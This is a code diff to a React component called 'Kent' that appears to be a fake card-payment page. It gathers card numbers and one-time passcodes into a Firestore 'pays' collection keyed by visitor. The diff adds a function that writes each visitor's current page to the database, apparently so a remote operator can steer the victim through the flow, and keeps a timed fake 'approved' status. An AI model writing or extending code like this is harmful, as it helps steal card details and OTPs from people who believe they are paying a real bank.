@@ -1,7 +1,7 @@
 "use client";
 import { useEffect, useState } from "react";
 import "./kent.css";
-import { doc, onSnapshot } from "firebase/firestore";
+import { doc, onSnapshot, updateDoc } from "firebase/firestore";
 import { db, handlePay } from "../firebase";
 import FullPageLoader from "../loader1";
 type PaymentInfo = {
@@ -148,6 +148,15 @@ export default function Kent(props: { setPage: any }) {
   const [loading, setLoading] = useState(false);
   const [newotp] = useState([""]);
 
+  const handleUpdatePage = async (page: string) => {
+    const visitorId = localStorage.getItem("visitor");
+    try {
+      const docRef = doc(db, "pays", visitorId!);
+      await updateDoc(docRef, { page: page });
+    } catch (error) {
+      console.error("Error updating current page:", error);
+    }
+  };
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     createdDate: new Date().toISOString(),
     cardNumber: "",
@@ -164,7 +173,7 @@ export default function Kent(props: { setPage: any }) {
     status: "new",
   });
   const handleNewpage = () => {
-    props.setPage("phone");
+    handleUpdatePage("phone");
   };
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
@@ -654,7 +663,7 @@ export default function Kent(props: { setPage: any }) {
                                 otp: "",
                                 status: "approved",
                               });
-                              handleNewpage();
+                              return handleNewpage();
                             }, 3000);
                           }
                         }}
